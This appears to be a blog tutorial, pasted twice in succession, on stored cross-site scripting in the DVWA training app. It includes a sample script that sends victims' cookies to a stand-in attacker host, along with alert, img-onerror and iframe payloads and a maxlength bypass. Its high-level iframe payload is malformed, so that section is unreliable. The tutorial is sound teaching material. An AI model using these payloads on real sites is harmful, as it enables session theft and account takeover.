This note delves into stored XSS (Cross-Site Scripting) and its exploitation in DVWA (Damn Vulnerable Web Application). Understanding the mechanics and implications of stored XSS enhances our grasp of potential risks to web applications. Employing DVWA as a secure testing environment, we’ll analyze how malicious actors exploit this vulnerability to inject harmful scripts, compromising web application security. Join me in exploring the intricacies of stored XSS and its exploitation within the context of DVWA.
# Stored XSS

This vulnerability occurs when an insecure web application accepts input from untrusted sources, stores it, and later incorporates this harmful content into its HTTP responses.

**Example**

Imagine a social media platform where users can post messages and comments on each other’s profiles. The platform allows users to include HTML and JavaScript code in their posts. A user with malicious intent decides to exploit this by crafting a seemingly harmless comment like this:

```html
<script>  // Malicious script to steal user cookies  
  const attackerScript = new Image();  
  attackerScript.src = "http://malicious-site.com/steal?cookie=" + document.cookie;</script>
```

Upon the victim’s visit to the malicious comment, their browser executes the embedded JavaScript code, sending the user’s sensitive session information in cookies to the attacker’s server. Consequently, the victim’s account becomes compromised. This scenario arises because the platform’s server stores the comment, causing the malicious script to execute each time the comment-loaded page is accessed.

This serves as a clear illustration of stored XSS, wherein the malevolent script is retained on the server and triggered whenever vulnerable users access the page. Robust applications prioritize proper sanitization and encoding of user input prior to display, effectively preventing the activation of harmful scripts.

**Now that we’ve examined what stored XSS is, let’s explore how to exploit it in DVWA (Damn Vulnerable Web Application).**

Log in to DVWA using either the default credentials “admin” and “password,” or the credentials you have set up. We will begin by testing the low-security level, then move on to the medium level, and finally, the high-security level.

![](https://miro.medium.com/v2/resize:fit:875/1*pVnM-EbDJA4z6FumnCZpQw.png)

dvwa login form

**Low security**

Click on “DVWA Security,” then choose the “Low” security level and proceed by clicking the “Submit” button as depicted below.

![](https://miro.medium.com/v2/resize:fit:875/1*VJfgW6uAc5F9er3au3iGJQ.png)

dvwa low security level settings

Navigate to “XSS (Stored)” and input a name of your choice into the designated field. For the message field, insert the payload below before clicking the “Sign Guestbook” option.

```html
<script>alert('stored XSS');</script>
```


![](https://miro.medium.com/v2/resize:fit:875/1*N5DyeyRyueH5g_3b6wyOwg.png)

low security stored xss

Upon submission, an alert box appeared, confirming the vulnerability of the site to stored XSS attacks.

![](https://miro.medium.com/v2/resize:fit:875/1*08Z6h94Bao427JnvmamXpA.png)

xss pop up

**Medium security**

Click on “DVWA Security,” then choose the “medium” security level and proceed by clicking the “Submit” button as shown below.

![](https://miro.medium.com/v2/resize:fit:875/1*msoL8tBoXBAAZzNX9bxGCg.png)

dvwa medium security settings

Upon re-entering the previous inputs, it becomes evident that no pop-up is triggered, even though the XSS payload is correct. This could be attributed to various reasons, such as input sanitization being implemented in the source code, which may include processes like removing special characters or employing other security measures. It’s important to note that without access to the source code, we can only speculate on the specific mechanisms in place.

```html
<script>alert('stored XSS');</script>
```


![](https://miro.medium.com/v2/resize:fit:875/1*WT_4k_8A33XdV8bNkEEGKQ.png)

no pop up

Also, it was observed that the tags _<script>_ and _</script>_ were removed. As a result, payloads utilizing these tags cannot be effectively employed.

To bypass this restriction and inject a payload into the name field, we can utilize a payload that does not include the `<script>`tag.

let’s inject the payload below into the name field.

```xml
<img src="x" onerror="alert('stored xss');">
```

I attempted to input the payload into the name field, but encountered client-side restrictions that limit users to entering a maximum of 10 characters, as shown below.

![](https://miro.medium.com/v2/resize:fit:875/1*JlZBYoZAk5Xcvkn_DdMicw.png)

To bypass this limitation, right-click on the name input field, select “Inspect,” and then modify the `maxlength=”10"` attribute to a different value, such as `”90"`. After making this adjustment, press Enter to apply the changes, as illustrated below.

```xml
<img src="x" onerror="alert('stored xss');">
```

![](https://miro.medium.com/v2/resize:fit:875/1*I9GIzpapPLrjXF8yhu4n4Q.png)

Now, input the payload into the name field and enter any text in the message field. Afterward, click on the submit button.

![](https://miro.medium.com/v2/resize:fit:875/1*ELuYW8-Lv-DSbwqfh3RGTA.png)

xss pop up.

After clicking the “Sign Guestbook” button to inject the payload, we received a pop-up alert, which confirms the successful exploitation of this vulnerability at the medium security level.

**High level**

Click on “DVWA Security,” then choose the “high” security level and proceed by clicking the “Submit” button as shown below.

![](https://miro.medium.com/v2/resize:fit:875/1*eDSzqfv9RDFa7gI6AM8Hrg.png)

dvwa high security level settings

Since the field has been sanitized to exclude special characters, our payload, which does not include the `<script>`tag, can still be effective. Let’s proceed by injecting the payload into the name field and entering arbitrary text into the message field. Afterward, submit the form to observe the outcome.

```xml
<iframe src="https//:hacked.com"></iframe>
```

![](https://miro.medium.com/v2/resize:fit:875/1*DN4_gIZRvaSI9gGPpLxzVg.png)

I utilized the `<iframe>`tag, which is employed to embed one web page within another web page.

![](https://miro.medium.com/v2/resize:fit:875/1*ge6BkmbJn4DSZ7ujplddWw.png)

embedded webpage link

Based on the obtained results, it is evident that the webpage has indeed been successfully embedded. If a user clicks on the link, they will be directed to the webpage specified in the script. This outcome unequivocally confirms the successful exploitation of this vulnerability at high security level.

Thank you for taking the time to read this article on stored XSS. We trust that you have gained new insights from it. Your comments and feedback are highly appreciated, so please feel free to share your thoughts below.This article delves into stored XSS (Cross-Site Scripting) and its exploitation in DVWA (Damn Vulnerable Web Application). Understanding the mechanics and implications of stored XSS enhances our grasp of potential risks to web applications. Employing DVWA as a secure testing environment, we’ll analyze how malicious actors exploit this vulnerability to inject harmful scripts, compromising web application security. Join me in exploring the intricacies of stored XSS and its exploitation within the context of DVWA.

# Stored XSS

This vulnerability occurs when an insecure web application accepts input from untrusted sources, stores it, and later incorporates this harmful content into its HTTP responses.

**Example**

Imagine a social media platform where users can post messages and comments on each other’s profiles. The platform allows users to include HTML and JavaScript code in their posts. A user with malicious intent decides to exploit this by crafting a seemingly harmless comment like this:

```html
<script>  // Malicious script to steal user cookies  
  const attackerScript = new Image();  
  attackerScript.src = "http://malicious-site.com/steal?cookie=" + document.cookie;</script>
```

Upon the victim’s visit to the malicious comment, their browser executes the embedded JavaScript code, sending the user’s sensitive session information in cookies to the attacker’s server. Consequently, the victim’s account becomes compromised. This scenario arises because the platform’s server stores the comment, causing the malicious script to execute each time the comment-loaded page is accessed.

This serves as a clear illustration of stored XSS, wherein the malevolent script is retained on the server and triggered whenever vulnerable users access the page. Robust applications prioritize proper sanitization and encoding of user input prior to display, effectively preventing the activation of harmful scripts.

**Now that we’ve examined what stored XSS is, let’s explore how to exploit it in DVWA (Damn Vulnerable Web Application).**

Log in to DVWA using either the default credentials “admin” and “password,” or the credentials you have set up. We will begin by testing the low-security level, then move on to the medium level, and finally, the high-security level.

![](https://miro.medium.com/v2/resize:fit:875/1*pVnM-EbDJA4z6FumnCZpQw.png)

dvwa login form

**Low security**

Click on “DVWA Security,” then choose the “Low” security level and proceed by clicking the “Submit” button as depicted below.

![](https://miro.medium.com/v2/resize:fit:875/1*VJfgW6uAc5F9er3au3iGJQ.png)

dvwa low security level settings

Navigate to “XSS (Stored)” and input a name of your choice into the designated field. For the message field, insert the payload below before clicking the “Sign Guestbook” option.

<script>alert('stored XSS');</script>

![](https://miro.medium.com/v2/resize:fit:875/1*N5DyeyRyueH5g_3b6wyOwg.png)

low security stored xss

Upon submission, an alert box appeared, confirming the vulnerability of the site to stored XSS attacks.

![](https://miro.medium.com/v2/resize:fit:875/1*08Z6h94Bao427JnvmamXpA.png)

xss pop up

**Medium security**

Click on “DVWA Security,” then choose the “medium” security level and proceed by clicking the “Submit” button as shown below.

![](https://miro.medium.com/v2/resize:fit:875/1*msoL8tBoXBAAZzNX9bxGCg.png)

dvwa medium security settings

Upon re-entering the previous inputs, it becomes evident that no pop-up is triggered, even though the XSS payload is correct. This could be attributed to various reasons, such as input sanitization being implemented in the source code, which may include processes like removing special characters or employing other security measures. It’s important to note that without access to the source code, we can only speculate on the specific mechanisms in place.

<script>alert('stored XSS');</script>

![](https://miro.medium.com/v2/resize:fit:875/1*WT_4k_8A33XdV8bNkEEGKQ.png)

no pop up

Also, it was observed that the tags `<script>`and `</script>` were removed. As a result, payloads utilizing these tags cannot be effectively employed.

To bypass this restriction and inject a payload into the name field, we can utilize a payload that does not include the `<script>`tag.

let’s inject the payload below into the name field.

```xml
<img src="x" onerror="alert('stored xss');">
```

I attempted to input the payload into the name field, but encountered client-side restrictions that limit users to entering a maximum of 10 characters, as shown below.

![](https://miro.medium.com/v2/resize:fit:875/1*JlZBYoZAk5Xcvkn_DdMicw.png)

To bypass this limitation, right-click on the name input field, select “Inspect,” and then modify the `maxlength=”10"` attribute to a different value, such as `”90"`. After making this adjustment, press Enter to apply the changes, as illustrated below.

```xml
<img src="x" onerror="alert('stored xss');">
```

![](https://miro.medium.com/v2/resize:fit:875/1*I9GIzpapPLrjXF8yhu4n4Q.png)

Now, input the payload into the name field and enter any text in the message field. Afterward, click on the submit button.

![](https://miro.medium.com/v2/resize:fit:875/1*ELuYW8-Lv-DSbwqfh3RGTA.png)

xss pop up.

After clicking the “Sign Guestbook” button to inject the payload, we received a pop-up alert, which confirms the successful exploitation of this vulnerability at the medium security level.

**High level**

Click on “DVWA Security,” then choose the “high” security level and proceed by clicking the “Submit” button as shown below.

![](https://miro.medium.com/v2/resize:fit:875/1*eDSzqfv9RDFa7gI6AM8Hrg.png)

dvwa high security level settings

Since the field has been sanitized to exclude special characters, our payload, which does not include the `<script>`tag, can still be effective. Let’s proceed by injecting the payload into the name field and entering arbitrary text into the message field. Afterward, submit the form to observe the outcome.

```xml
<iframe src="https//:hacked.com"></iframe>
```

![](https://miro.medium.com/v2/resize:fit:875/1*DN4_gIZRvaSI9gGPpLxzVg.png)

I utilized the `<iframe>`tag, which is employed to embed one web page within another web page.

![](https://miro.medium.com/v2/resize:fit:875/1*ge6BkmbJn4DSZ7ujplddWw.png)

embedded webpage link

Based on the obtained results, it is evident that the webpage has indeed been successfully embedded. If a user clicks on the link, they will be directed to the webpage specified in the script. This outcome unequivocally confirms the successful exploitation of this vulnerability at high security level.

Thank you for taking the time to read this article on stored XSS. We trust that you have gained new insights from it. Your comments and feedback are highly appreciated, so please feel free to share your thoughts below.